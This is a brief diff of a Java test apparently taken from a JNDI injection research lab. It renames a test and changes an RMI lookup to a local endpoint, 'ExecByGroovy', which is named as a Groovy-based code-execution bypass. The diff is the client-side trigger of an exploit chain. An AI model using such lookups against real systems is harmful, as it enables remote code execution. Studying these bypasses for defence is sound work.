@@ -15,9 +15,9 @@ public class Target {
     }
 
     @Test
-    public void lookupBypassByGroovyParse()throws NamingException{
+    public void lookupBypassByGroovy()throws NamingException{
         InitialContext ctx = new InitialContext();
-        ctx.lookup("rmi://127.0.0.1:1097/ExecByGroovyParse");
+        ctx.lookup("rmi://127.0.0.1:1097/ExecByGroovy");
     }
 
 
